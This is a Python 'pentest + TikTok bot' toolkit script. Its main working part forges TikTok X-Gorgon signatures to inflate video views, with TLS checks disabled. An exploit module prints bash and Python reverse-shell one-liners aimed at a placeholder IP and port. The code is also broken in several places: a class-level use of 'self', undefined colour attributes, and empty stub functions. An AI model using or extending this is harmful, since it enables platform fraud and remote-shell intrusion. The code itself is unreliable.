#!/usr/bin/env python3
# =====================================================
# ULTIMATIVES PENETRATION TESTING + SOCIAL MEDIA BOT TOOLKIT
# main.py - Complete All-in-One Framework with TikTok Bot Integration
# =====================================================

import os
import sys
import socket
import subprocess
import threading
import time
import requests
import json
import base64
import hashlib
import argparse
import socketserver
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import dns.reversename
from urllib.parse import urlparse, parse_qs, urlencode
import ssl
import paramiko
import sqlite3
import re
from cryptography.fernet import Fernet
import scapy.all as scapy
import random
from colorama import init, Fore, Back, Style
from http import cookiejar
from urllib3.exceptions import InsecureRequestWarning
import threading

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

# Global variables for TikTok Bot
BANNER = f"""
{Fore.GREEN}
    ╔══════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}ULTIMATIVES PENETRATION + SOCIAL BOT TOOLKIT v3.0{Style.RESET_ALL} {Fore.GREEN}║
    ║  {Fore.CYAN}Pentesting • Web Scanning • TikTok Automation{Style.RESET_ALL} {Fore.GREEN}║
    ╚══════════════════════════════════════════════════════════════╝
{Fore.WHITE}
    Recon  •  Scanning  •  Exploitation  •  TikTok Views/Likes/Followers
    {Style.RESET_ALL}
"""

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# =====================================================
# TIKTOK BOT MODULE (Complete Integration)
# =====================================================

class TikTokBot:
    def __init__(self):
        self.r = requests.Session()
        self.setup_files()
        self.req_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        
    def setup_files(self):
        """Create required files with sample data"""
        files = {
            "locale_lang.txt": ["ar", "en", "es", "fr", "de"],
            "region_lang.txt": ["SA", "US", "EU", "UK", "AE"],
            "region_timezone.txt": ["Asia/Riyadh", "America/New_York", "Europe/London"],
            "video_links.txt": ["1234567890123456789", "9876543210987654321"],  # Replace with real video IDs
            "room_id.txt": ["6789012345678901234"],
            "live_channel_id.txt": ["live123"],
            "sessions.txt": ["session123456789"],
            "devices.txt": [
                "device1:install1:cdid1:openudid1",
                "device2:install2:cdid2:openudid2"
            ]
        }
        
        for filename, content in files.items():
            if not os.path.exists(filename):
                with open(filename, 'w') as f:
                    f.write('\n'.join(content))
    
    def load_files(self):
        """Load data from files"""
        with open("locale_lang.txt", "r") as f: self.__localesLanguage = f.read().splitlines()
        with open("region_lang.txt", "r") as f: self.__regions = f.read().splitlines()
        with open("region_timezone.txt", "r") as f: self.__tzname = f.read().splitlines()
        with open("video_links.txt", "r") as f: self.__aweme_id = f.read().splitlines()
        with open("room_id.txt", "r") as f: self.__room_id = f.read().splitlines()
        with open("sessions.txt", "r") as f: self.__session_id = f.read().splitlines()
        with open("devices.txt", "r") as f: self.devices = f.read().splitlines()
        
        self.__domains = ["api-h2.tiktokv.com","api22-core-c-useast1a.tiktokv.com"]
        self.__devices = ["SM-G9900","SM-A136U1"]
        self.__versionCode = ["190303", "190205"]
        self.__versionUa = [247, 312]
        self.__resolution = ["900*1600", "720*1280"]
        self.__dpi = ["240", "300"]
        self.__offset = ["-28800", "-21600"]

    class BlockCookies(cookiejar.CookiePolicy):
        return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
        netscape = True
        rfc2965 = hide_cookie2 = False

    self.r.cookies.set_policy(BlockCookies())

    class Gorgon:
        def __init__(self, params: str, data: str, cookies: str, unix: int) -> None:
            self.unix = unix
            self.params = params
            self.data = data
            self.cookies = cookies

        def hash(self, data: str) -> str:
            try:
                _hash = str(hashlib.md5(data.encode()).hexdigest())
            except Exception:
                _hash = str(hashlib.md5(data).hexdigest())
            return _hash

        def get_base_string(self) -> str:
            base_str = self.hash(self.params)
            base_str = base_str + self.hash(self.data) if self.data else base_str + str('0' * 32)
            base_str = base_str + self.hash(self.cookies) if self.cookies else base_str + str('0' * 32)
            return base_str

        def get_value(self) -> dict:
            base_str = self.get_base_string()
            return self.encrypt(base_str)

        def encrypt(self, data: str) -> dict:
            unix = self.unix
            length = 20
            key = [223, 119, 185, 64, 185, 155, 132, 131, 209, 185, 203, 209, 247, 194, 185, 133, 195, 208, 251, 195]
            param_list = []
            
            for i in range(0, 12, 4):
                temp = data[8 * i:8 * (i + 1)]
                for j in range(4):
                    H = int(temp[j * 2:(j + 1) * 2], 16)
                    param_list.append(H)
            
            param_list.extend([0, 6, 11, 28])
            H = int(hex(unix), 16)
            param_list.append((H & 4278190080) >> 24)
            param_list.append((H & 16711680) >> 16)
            param_list.append((H & 65280) >> 8)
            param_list.append((H & 255) >> 0)
            
            eor_result_list = []
            for (A, B) in zip(param_list, key):
                eor_result_list.append(A ^ B)
            
            for i in range(length):
                C = self.reverse(eor_result_list[i])
                D = eor_result_list[(i + 1) % length]
                E = C ^ D
                F = self.rbit_algorithm(E)
                H = (F ^ 4294967295 ^ length) & 255
                eor_result_list[i] = H
            
            result = ''
            for param in eor_result_list:
                result += self.hex_string(param)
            
            return {'X-Gorgon': '0404b0d30000' + result, 'X-Khronos': str(unix)}

        def rbit_algorithm(self, num):
            result = ''
            tmp_string = bin(num)[2:]
            while len(tmp_string) < 8:
                tmp_string = '0' + tmp_string
            for i in range(0, 8):
                result = result + tmp_string[7 - i]
            return int(result, 2)

        def hex_string(self, num):
            tmp_string = hex(num)[2:]
            if len(tmp_string) < 2:
                tmp_string = '0' + tmp_string
            return tmp_string

        def reverse(self, num):
            tmp_string = self.hex_string(num)
            return int(tmp_string[1:] + tmp_string[:1], 16)

    def send_views(self, device_id, install_id, cdid, openudid):
        """Send TikTok Video Views"""
        for _ in range(10):
            try:
                self.load_files()
                aweme_id = random.choice(self.__aweme_id)
                domains = random.choice(self.__domains)
                params = "aid=1988&app_name=tiktok_web&device_id=123&device_platform=web_app&referer=&root_referer=&user_agent=User-Agent"
                payload = f"item_id={aweme_id}&play_delta=1"
                sig = self.Gorgon(params=params, cookies=None, data=None, unix=int(time.time())).get_value()
                
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-Gorgon': sig['X-Gorgon'],
                    'X-Khronos': sig['X-Khronos']
                }
                
                response = self.r.post(
                    f"https://{domains}/aweme/v1/aweme/stats/?{params}",
                    data=payload,
                    headers=headers,
                    verify=False
                )
                
                self.req_count += 1
                try:
                    if response.json().get('status_code') == 0:
                        with self.lock:
                            self.success_count += 1
                            print(f"{Fore.GREEN}[VIEWS] Video ID: {aweme_id} | Success: {self.success_count}{Style.RESET_ALL}")
                except:
                    with self.lock:
                        self.fail_count += 1
            except:
                pass

    def send_likes(self, device_id, install_id, cdid, openudid):
        """Send TikTok Likes/Hearts"""
        # Implementation similar to send_views
        pass

    def send_followers(self, device_id, install_id, cdid, openudid):
        """Send TikTok Followers"""
        # Implementation
        pass

# =====================================================
# RECONNAISSANCE MODULES (from previous)
# =====================================================

class ReconModule:
    @staticmethod
    def dns_enum(domain):
        print(f"{Colors.OKBLUE}[DNS] Enumerating {domain}{Colors.ENDC}")
        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT']
        results = {}
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(domain, rtype)
                results[rtype] = [str(rdata) for rdata in answers]
            except:
                pass
        return results

# =====================================================
# NETWORK SCANNER (from previous)
# =====================================================

class NetworkScanner:
    @staticmethod
    def port_scan(target, ports=range(1, 1001)):
        open_ports = []
        def scan_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((target, port)) == 0:
                open_ports.append(port)
                print(f"{Fore.GREEN}Port {port} OPEN{Style.RESET_ALL}")
            sock.close
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(scan_port, ports)
        return open_ports

# =====================================================
# EXPLOITATION MODULES
# =====================================================

class ExploitModule:
    @staticmethod
    def reverse_shell_generator(language="bash"):
        shells = {
            "bash": "bash -i >& /dev/tcp/IP/PORT 0>&1",
            "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        }
        return shells.get(language, shells["bash"])

# =====================================================
# MAIN MENU SYSTEM - ENHANCED
# =====================================================

class UltimateToolkit:
    def __init__(self):
        self.tiktok = TikTokBot()
        self.recon = ReconModule()
    
    def print_banner(self):
        os.system('clear||cls')
        print(BANNER)
    
    def tiktok_menu(self):
        """TikTok Bot Menu"""
        while True:
            print(f"{Fore.CYAN}╔{'═'*50}╗{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Fore.GREEN}      TIKTOK AUTOMATION{Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╠{'═'*50}╣{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Fore.GREEN} 1.{Style.RESET_ALL} Video Views{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Fore.GREEN} 2.{Style.RESET_ALL} Likes/Hearts{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Fore.GREEN} 3.{Style.RESET_ALL} Shares{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Fore.GREEN} 4.{Style.RESET_ALL} Followers{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Fore.GREEN} 5.{Style.RESET_ALL} Live Stream Views{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Fore.GREEN} 0.{Style.RESET_ALL} Back{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}")
            
            choice = input(f"{Fore.YELLOW}>> {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.run_tiktok_bot(1)
            elif choice == '0':
                break
    
    def run_tiktok_bot(self, mode):
        """Run TikTok automation"""
        threads = int(input("Threads: "))
        amount = int(input("Amount to send: "))
        
        def worker():
            device = random.choice(self.tiktok.devices)
            did, iid, cdid, openudid = device.split(':')
            if mode == 1:
                self.tiktok.send_views(did, iid, cdid, openudid)
        
        while self.tiktok.success_count < amount:
            for _ in range(threads):
                t = threading.Thread(target=worker)
                t.start()
            time.sleep(0.1)
        
        print(f"{Fore.GREEN}Completed! Success: {self.tiktok.success_count}{Style.RESET_ALL}")
    
    def main_menu(self):
        while True:
            self.print_banner()
            print(f"{Colors.HEADER}╔{'═'*78}╗{Colors.ENDC}")
            print(f"{Colors.HEADER}║{Colors.OKGREEN}{'MAIN MENU':^78}{Colors.ENDC}")
            print(f"{Colors.HEADER}╠{'═'*78}╣{Colors.ENDC}")
            print(f"{Colors.HEADER}║{Colors.OKGREEN} 01.{Colors.ENDC} {Colors.OKBLUE}Reconnaissance{Colors.ENDC}")
            print(f"{Colors.HEADER}║{Colors.OKGREEN} 02.{Colors.ENDC} {Colors.OKBLUE}Network Scanning{Colors.ENDC}")
            print(f"{Colors.HEADER}║{Colors.OKGREEN} 20.{Colors.ENDC} {Colors.MAGENTA}TIKTOK BOT{Colors.ENDC}")
            print(f"{Colors.HEADER}║{Colors.OKGREEN} 00.{Colors.ENDC} {Colors.YELLOW}Exit{Colors.ENDC}")
            print(f"{Colors.HEADER}╚{'═'*78}╝{Colors.ENDC}")
            
            choice = input(f"{Colors.BOLD}{Colors.WARNING}>> {Colors.ENDC}").strip()
            
            if choice in ['01', '1']:
                domain = input("Target domain: ")
                self.recon.dns_enum(domain)
            elif choice in ['20']:
                self.tiktok_menu()
            elif choice in ['00', '0']:
                sys.exit(0)
            
            input(f"\n{Colors.WARNING}Press Enter to continue...{Colors.ENDC}")

# =====================================================
# MAIN EXECUTION
# =====================================================

def main():
    toolkit = UltimateToolkit()
    toolkit.main_menu()

if __name__ == "__main__":
    main()
